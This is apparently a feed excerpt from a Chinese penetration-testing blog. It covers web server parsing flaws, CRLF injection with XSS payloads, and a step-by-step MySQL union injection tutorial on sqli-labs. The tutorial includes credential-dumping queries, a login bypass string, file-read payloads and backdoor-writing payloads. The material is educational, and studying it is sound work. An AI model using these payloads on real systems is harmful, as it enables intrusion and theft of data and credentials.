id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h1><h2 id="IIS6-0文件解析漏洞"><a href="#IIS6-0文件解析漏洞" class="headerlink" title="IIS6.0文件解析漏洞"></a>IIS6.0文件解析漏洞</h2><ol><li>IIS除了可以解析.asp后缀的脚本以外，<strong>还可以解析.cer和.asa后缀的文件</strong>。</li><li>特殊符号“&#x2F;”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行</li><li>特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行<br>IIS7.5文件解析漏洞<br>任意文件名&#x2F;任意文件名.php，解析为php脚本文件。</li></ol><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="Apache-httpd-多后缀解析漏洞"><a href="#Apache-httpd-多后缀解析漏洞" class="headerlink" title="Apache httpd 多后缀解析漏洞"></a>Apache httpd 多后缀解析漏洞</h3><p>主要是因为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）</p><h3 id="Apache换行解析漏洞（CVE-2017-15715）"><a href="#Apache换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache换行解析漏洞（CVE-2017-15715）"></a>Apache换行解析漏洞（CVE-2017-15715）</h3><p>影响范围：2.4.0-2.4.29版本</p><p>原因：合法后缀配置文件中的正则表达式中$不仅匹配字符串结尾位置，还可以匹配\n或\r，在解析php时，1.php\x0A将按照.php进行解析，而’.php\x0A’ !&#x3D; ‘.php’,可能过滤时过滤了.php但没有过滤.php\x0A从而实现绕过。</p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>任意文件名&#x2F;任意文件名.php，解析为php脚本文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; title=&quot;文件上传&quot;&gt;&lt;/a&gt;文件上传&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CRLF注入漏洞（反弹型XSS）</title>
    <link href="https://frankcao3.github.io/posts/12746"/>
    <id>https://frankcao3.github.io/posts/12746</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRLF-注入漏洞"><a href="#CRLF-注入漏洞" class="headerlink" title="CRLF 注入漏洞"></a>CRLF 注入漏洞</h1><p>参考：<a href="https://blog.csdn.net/weixin_44431280/article/details/122869484">https://blog.csdn.net/weixin_44431280/article/details/122869484</a></p><h2 id="CRLF-简介"><a href="#CRLF-简介" class="headerlink" title="CRLF 简介"></a>CRLF 简介</h2><p><strong>CRLF</strong> 指的就是<strong>回车符</strong>（CR，ASCII-13，<code>\r</code>，<code>%0d</code>）和<strong>换行符</strong>（LF，ASCII-10，<code>\n</code>，<code>%0a</code>）</p><p>即<code>%0d%0a</code>。</p><p>操作系统就是通过这个标识进行换行的，相当于我们键盘的回车键。</p><p><strong>HTTP协议中的CRLF</strong>：</p><p>在HTTP协议报文中，请求行与请求头通过一个CRLF（\r\n）隔开，<u><strong>请求头</strong>（header）和<strong>请求正文</strong>（body）之间通过两个CRLF（\r\n）隔开</u>，如下图：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811170742129.png" alt="image-20220811170742129"></p><p>所以，一旦我们通过URL能够控制HTTP 消息头（请求行）中的字符，注入一些恶意的换行，这样我们就能<strong>构造恶意的请求行或请求正文</strong>，注入一些会话Cookie或者HTML代码。所以CRLF Injection又称为<strong>HTTP响应拆分漏洞</strong>HTTP Response Splitting，简称HRS。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="Cookie会话固定"><a href="#Cookie会话固定" class="headerlink" title="Cookie会话固定"></a>Cookie会话固定</h3><p>在URL参数中构造<code>%0d%0aSet-Cookie:crlf=ture</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811171140761.png" alt="image-20220811171140761"></p><p>查看HTTP响应包，可以发现HTTP响应头存在了<code>Set-Cookie:crlf=true</code>。因为加入了一个CRLF，所以URL中的一部分内容被作为请求头解析，而$_GET变量接受的URL会直接作为响应头中的Location字段返回。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811171158328.png" alt="image-20220811171158328"></p><h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>如果此时我们在URL中加入<code>%0d%0aSet-Cookie:%20de=a%0d%0a%0d%0a&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，那么服务端返回界面将会如下图：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811172139448.png" alt="image-20220811172139448"></p><p>因为添加了两个CRLF的情况，JS脚本会被识别为HTTP响应正文被浏览器执行，那么就会产生反射性XSS攻击.</p><h2 id="CRLF注入漏洞防护建议"><a href="#CRLF注入漏洞防护建议" class="headerlink" title="CRLF注入漏洞防护建议"></a>CRLF注入漏洞防护建议</h2><ul><li><p>服务端前增加WAF进行防护</p></li><li><p>对用户的数据进行合法性校验，对特殊的字符进行编码，如 &lt;、&gt;、’、”、CR、LF 等，限制用户输入的 CR 和 LF，或者对 CR 和 LF 字符正确编码后再输出，以防止注入自定义 HTTP 头避免输入的数据污染其他 HTTP 首部字段。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRLF-注入漏洞&quot;&gt;&lt;a href=&quot;#CRLF-注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;CRLF 注入漏洞&quot;&gt;&lt;/a&gt;CRLF 注入漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/weixin_4</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://frankcao3.github.io/posts/26401"/>
    <id>https://frankcao3.github.io/posts/26401</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image/resize,w_937,limit_0" alt="SQL注入-小迪安全.png"></p><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的<u>输入参数</u>中的攻击，之后再将这些参数<u>传递给后台的sql服务器加以解析和执行</u>。</p><p>sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p><p>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。</p><h2 id="2-产生过程"><a href="#2-产生过程" class="headerlink" title="2. 产生过程"></a>2. 产生过程</h2><p>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均<u>提供了可编程的方法来与数据库连接并进行交互</u>。</p><p>如果web应用开发人员无法确保在<u>将从web表单，cookie及输入参数等收到的值传递给sql查询</u>（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够<u>操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</u></p><h2 id="3-常见原因"><a href="#3-常见原因" class="headerlink" title="3. 常见原因"></a>3. 常见原因</h2><p>①转义字符处理不合适；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤多个提交处理不当。 </p><h3 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h3><p>sql数据库将<strong>单引号字符（’）解析成代码与数据间的分界线</strong>：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p><h3 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h3><p>数据库带有很多默认的用户预安装内容，比如默认账户名、默认表名等，这些可能会成为SQL注入访问数据库的首要尝试。</p><p>SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p><p>攻击者利用sql注入漏洞时，通常会<u>尝试访问数据库的元数据</u>，比如<u>内部的数据库和表的名称、列的数据类型和访问权限</u>，例如MySQL服务器的元数据位于<code>information_schema</code>虚拟数据库中，可通过<code>show databases</code>和<code>show tables</code>命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p><h3 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h3><p>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，<u>攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值</u>。</p><h3 id="不当的错误处理（盲注）"><a href="#不当的错误处理（盲注）" class="headerlink" title="不当的错误处理（盲注）"></a>不当的错误处理（盲注）</h3><p>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是<u>将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击</u>。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p><h3 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h3><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p><h2 id="4-危害"><a href="#4-危害" class="headerlink" title="4. 危害"></a>4. 危害</h2><p>盗取网站的数据库敏感信息</p><p>绕过网站后台认证（万能密码：<code>‘ or ‘1’=‘1’ #</code> 登录绕过）</p><p>借助SQL注入漏洞提权获取系统权限</p><p>上传或读取文件</p><p>执行系统命令</p><h2 id="5-MySQL注入流程"><a href="#5-MySQL注入流程" class="headerlink" title="5. MySQL注入流程"></a>5. MySQL注入流程</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142843140.png" alt="image.png"></p><p>以sqli-labs为例：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623816863968-03b39520-736a-4953-9193-393137069010.png" alt="image.png"></p><ul><li><p>查看源码，分析注入原理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>在上面的代码中可以看到，网页以get请求获得id变量的值，然后将变量id拼接到数据库查询语句，进行数据库操作：<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>直接传递的变量$id带入sql语句中执行没有做任何的限制。</p></li></ul><h3 id="判断注入点以及注入类型"><a href="#判断注入点以及注入类型" class="headerlink" title="判断注入点以及注入类型"></a>判断注入点以及注入类型</h3><p>在给id赋值时加上其他无意义的字符<code>id=1abc</code>或者<code>id=1 and 1=1</code>、<code>id=1 and 1=2</code>，或者更换闭合条件为单引号<code>1&#39; and 1=1#</code>、 <code>1&#39; and 1=2#</code>之类的字符串，如果网站在不同输入下能回显出不同页面（显示1的结果（解析了and 1&#x3D;1）或者回显为空（解析了and 1&#x3D;2）），证明有SQL注入漏洞。如果网站显示404或者500之类的错误或其他报错，说明网站进行了字符过滤之类的操作，没有SQL注入漏洞。</p><p>闭合条件根据SQL语句的结构不同而不同，数字型就没有闭合，字符型就是单引号或双引号，再次基础上还有可能跟一个或多个括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 LIMIT 0,1 </span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1  # 页面回显，正常输出</span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1  # 页面回显，提示错误 </span><br></pre></td></tr></table></figure><h3 id="信息收集（高版本数据库）"><a href="#信息收集（高版本数据库）" class="headerlink" title="信息收集（高版本数据库）"></a>信息收集（高版本数据库）</h3><p><strong>必要知识点:</strong></p><p><em>在<strong>MYSQL5.0以上版本</strong>中，mysql存在一个自带数据库，名为<code>information_ schema</code>，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。数据库中符号”.”代表下一级，比如xiao.user代表数据库xiao中的表user。因此：</em></p><p><code>information_ schema.tables</code>：记录所有表名信息的表</p><p><code>information_ schema.columns</code>：记录所有列名信息的表</p><p><code>table_schema</code>：数据库名</p><p><code>tables_name</code>：表名</p><p><code>column_name</code>：列名</p><p>performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><h4 id="猜解数据库列数（字段数）"><a href="#猜解数据库列数（字段数）" class="headerlink" title="猜解数据库列数（字段数）"></a>猜解数据库列数（字段数）</h4><p>使用<code>order by</code>判断列数。oder by 用于指定查询结果按照第几列进行排序，若所指定的列号超出数据库表原本的列数，就会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=1 order by 5</span><br></pre></td></tr></table></figure><p>以下结果中，order by 4有回显，order by 5就出现报错了，说明列的数量为4。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/b292dcde41c4abdc906e588bcbd1d9f974c684b0.png@831w_161h_progressive.webp" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/article/f318d092797ad93d870e6043a4349e3383507bac.png@831w_141h_progressive.webp" alt="img"></p><h4 id="判断前端回显"><a href="#判断前端回显" class="headerlink" title="判断前端回显"></a>判断前端回显</h4><p>判断select的哪几个位置会被前端回显，后续查询就在该位置进行。<strong>其中令id为-1就可以使union前的语句为假，从而只显示union后面语句的执行结果。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p>结果显示2，3的位置会被前端回显。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142202091.png" alt="image-20220726142202091"></p><h4 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select version()</span><br></pre></td></tr></table></figure><h4 id="查询数据库名称"><a href="#查询数据库名称" class="headerlink" title="查询数据库名称"></a>查询数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select database()</span><br></pre></td></tr></table></figure><h4 id="查询数据库用户"><a href="#查询数据库用户" class="headerlink" title="查询数据库用户"></a>查询数据库用户</h4><p>若是root用户，则方便执行进一步的攻击行为，如利用SQL上传文件，redis未授权漏洞写入计划任务的利用方式也是需要root权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select user()</span><br></pre></td></tr></table></figure><h4 id="查询操作系统"><a href="#查询操作系统" class="headerlink" title="查询操作系统"></a>查询操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@version_compile_os</span><br></pre></td></tr></table></figure><p>比如注入时，发现第2、3个位置会回显，在这个2个位置查询用户和操作系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,user(),@@version_compile_os,4</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726112454906.png" alt="image-20220726112454906"></p><p>以及数据库名称和版本名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version(),4</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726143807180.png" alt="image-20220726143807180"></p><h4 id="查询指定数据库下的表名信息"><a href="#查询指定数据库下的表名信息" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><p>根据刚才的信息收集，已知当前页面所操作的数据库名为mozhe_ Discuz_ stormGroup，或者直接使用database()表示，然后可以借助<code>information_ schema.tables</code>查询该数据库的所有表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145018620.png" alt="image-20220726145018620"></p><p>得到表名之后要确定哪一个表存储着用户数据，可以根据表名猜测或是逐表查看字段。</p><h4 id="查询指定表名下的列名"><a href="#查询指定表名下的列名" class="headerlink" title="查询指定表名下的列名"></a>查询指定表名下的列名</h4><p>根据刚才收集的表名StormGroup_member，查询该表的所有列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name= &#x27;StormGroup_member&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145307736.png" alt="image-20220726145307736"></p><h4 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><p>根据刚才收集的表名、列名，可以查询该表的指定数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,name,password,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145504487.png" alt="image-20220726145504487"></p><p>指定数据可能有多个结果，可以使用<code>limit x,1</code>（从x的位置读取1条记录），变动猜解，得到不同结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1</span><br></pre></td></tr></table></figure><p>得到的密码一般为MD5，去cmd5.com碰撞一下。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145823634.png" alt="image-20220726145823634"></p><h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>MYSQL 注入中首先要明确<strong>当前注入点权限</strong>（取决于注入点所使用的数据库用户的权限，使用user()语句查询），高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。 </p><p>比如上述注入中借助的是root账户的权限进行数据库操作，若root用户具有当前数据库之外的操作权限，那么就可以注入其他数据库获取想要的信息。</p><p>imformation_schema除了记录有所有的表名、列名，还有所有的数据库名：</p><p><code>imformation_schema.schemata</code>：记录所有数据库名信息的表（跨库），其中字段<code>schema_name</code>表示数据库名。</p><p><strong>查询的前提是用户具有相应的权限。</strong></p><h4 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155012588.png" alt="image-20220726155012588"></p><h4 id="查询指定数据库下的表名信息-1"><a href="#查询指定数据库下的表名信息-1" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;qqyw&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155117482.png" alt="image-20220726155117482"></p><h4 id="查询指定表名下的列名信息"><a href="#查询指定表名下的列名信息" class="headerlink" title="查询指定表名下的列名信息"></a>查询指定表名下的列名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27; limit 0,1   # 当出现多个记录时，可以使用limit 0,1取第一个记录</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155734752.png" alt="image-20220726155734752"></p><h4 id="查询指定数据-1"><a href="#查询指定数据-1" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,u,p,4 from qqyw.admin    # 查询u,p两列的数据，注意指定admin来自qqyw</span><br></pre></td></tr></table></figure><h3 id="信息收集（低版本数据库）"><a href="#信息收集（低版本数据库）" class="headerlink" title="信息收集（低版本数据库）"></a>信息收集（低版本数据库）</h3><p>暴力查询或结合读取查询</p><ul><li>SQLmap工具——字典dicts.py</li><li>load_file读取源代码的数据库查询语句</li><li>暴力猜解——admin，password，passwd，user，member</li></ul><h3 id="x3D-x3D-文件读写操作-x3D-x3D"><a href="#x3D-x3D-文件读写操作-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;"></a>&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;</h3><ul><li><p>**load_file()**：读取函数，读取文件内容</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160705262.png" alt="image-20220726160705262"></p><p>常见的load_file()读取的敏感信息路径：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,loadfile(&#x27;d:/www.txt&#x27;),3</span><br><span class="line">id=-1 union select 1,load_file(&#x27;C:/phpstudy/PHPTutorial/WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;),3</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162851222.png" alt="image-20220726162851222"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163415752.png" alt="image-20220726163415752"></p></li><li><p><strong>into outfile</strong> 或 <strong>into dumpfile</strong> ：上传文件（写入后门、木马）</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160842023.png" alt="image-20220726160842023"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;x&#x27;,3 into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\x.php&#x27;--+</span><br></pre></td></tr></table></figure><p>其中–+用于注释后面的语句，后面有limit 0,1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163809879.png" alt="image-20220726163809879"></p></li></ul><h4 id="文件路径获取"><a href="#文件路径获取" class="headerlink" title="文件路径获取"></a>文件路径获取</h4><p>文件的读写都需要获取到文件路径，路径获取常见方法包括：</p><p><strong>报错显示</strong>：网站报错时，显示的一些路径信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161419446.png" alt="image-20220726161419446"></p><p><strong>遗留文件</strong>：站长调试网站时遗留的一些文件，比如phpinfo.php。通过该文件可以得到路径信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161626302.png" alt="image-20220726161626302"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161656508.png" alt="image-20220726161656508"></p><p><strong>报错信息的漏洞</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161808375.png" alt="image-20220726161808375"></p><p><strong>平台配置文件</strong>（不实用）：</p><p>比如在phpStudy中，配置文件C:\phpstudy\PHPTutorial\Apache\conf\vhosts.conf中保存了网站的绝对路径，缺点是配置文件的路径并不固定。<br><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162129913.png" alt="image-20220726162129913"></p><p><strong>爆破</strong>：</p><p>PhpMyAdmin、phpcms等会有惯用的一些路径，可以进行路径爆破：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162408932.png" alt="image-20220726162408932"></p><h4 id="读写问题：魔术引号开关"><a href="#读写问题：魔术引号开关" class="headerlink" 